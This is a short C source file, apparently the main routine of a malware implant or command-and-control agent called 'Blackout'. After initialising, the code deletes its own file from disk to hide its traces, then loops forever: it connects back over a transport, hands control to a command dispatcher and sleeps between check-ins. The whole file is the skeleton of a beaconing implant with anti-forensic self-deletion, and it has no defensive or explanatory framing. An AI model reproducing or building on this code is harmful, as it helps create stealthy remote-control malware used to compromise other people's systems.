#include <common.h>
#include <constexpr.h>

FUNC VOID BlackoutMain(
    _In_ PVOID Param
) {
    BLACKOUT_INSTANCE
    
    BlackoutInit();
    
    if ( !SelfDeletion() )
        BK_PRINT( "[+] self delete failed %d...\n", NtLastError() );

    do {
        if ( !Instance()->Session.Connected ) {
            if ( TransportInit() )
                CommandDispatcher();
        }
        SleepMain( Instance()->Session.SleepTime * 1000 );
    } while ( TRUE );
    
}

